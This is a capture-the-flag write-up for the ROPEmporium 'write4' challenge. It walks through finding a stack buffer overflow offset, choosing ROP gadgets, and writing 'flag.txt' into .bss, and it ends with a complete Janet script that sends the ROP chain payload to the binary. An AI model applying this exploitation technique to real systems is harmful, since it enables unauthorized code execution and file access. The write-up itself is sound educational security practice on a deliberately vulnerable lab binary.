# write4 (ROPEmporium Challenge 4)

## Locate ret address position on stack

```
gdb ./write4
pattern create 200 pattern.txt
r < pattern.txt
# segfault occurs here
x/2wx $rsp
# 0x41304141
pattern offset 0x41304141
# ... found at offset: 40
```

## Analysis & Making a Plan

```sh
checksec --file=write4
checksec --file=libwrite4.so

rabin2 -z write4
readelf -a write4

objdump -d write4
objdump -d libwrite4.so
```

- main calls pwnme@plt
- buffer overflow, jump to gadget:
  ```
  400690:	41 5e                	pop    %r14
  400692:	41 5f                	pop    %r15
  400694:	c3                   	ret
  ```
- jump to gadget:
  ```
  400628:	4d 89 3e             	mov    %r15,(%r14)
  40062b:	c3                   	ret
  ```
- so r15 must contain the string "flag.txt" (8 bytes, just enough for us)
- r14 must contain an address that we can write to
- print_file@plt receives first argument (string) in rdi -> must contain address of "flag.txt"
  ```
  400693                 5f  pop rdi
  400694                 c3  ret
  ```
- finally, jump to print_file@plt

## Writeable?

```sh
readelf -a write4

# [23] .data             PROGBITS         0000000000601028  00001028
#      0000000000000010  0000000000000000  WA       0     0     8
# [24] .bss              NOBITS           0000000000601038  00001038
#      0000000000000008  0000000000000000  WA       0     0     1
```

`.bss` is a section for uninitialized data.
We can write our "flag.txt" string here `0x0000000000601038`.

## Exploit Script

```janet
#!/usr/bin/env janet
(use sh)
# (print `\x` (string/join (reverse (partition 2 "0000000000601038")) `\x`))
# \x38\x10\x60\x00\x00\x00\x00\x00

# (print `\x` (string/join (map (partial string/format "%x") (string/bytes "flag.txt")) `\x`))
# \x66\x6c\x61\x67\x2e\x74\x78\x74

(def input (string/join [(string/repeat 'A 40)
                         "\x90\x06\x40\x00\x00\x00\x00\x00" # pop %r14; pop %r15; ret gadget
                         "\x38\x10\x60\x00\x00\x00\x00\x00" # r14: address to store string into
                         "\x66\x6c\x61\x67\x2e\x74\x78\x74" # r15: "flag.txt"
                         "\x28\x06\x40\x00\x00\x00\x00\x00" # mov %r15,(%r14)
                         "\x93\x06\x40\x00\x00\x00\x00\x00" # pop %rdi; ret gadget
                         "\x38\x10\x60\x00\x00\x00\x00\x00" # rdi: address of string
                         "\x10\x05\x40\x00\x00\x00\x00\x00" # print_file@plt
                         ""]))
(spit "payload.txt" input)
($ ./write4 < ,input)
```
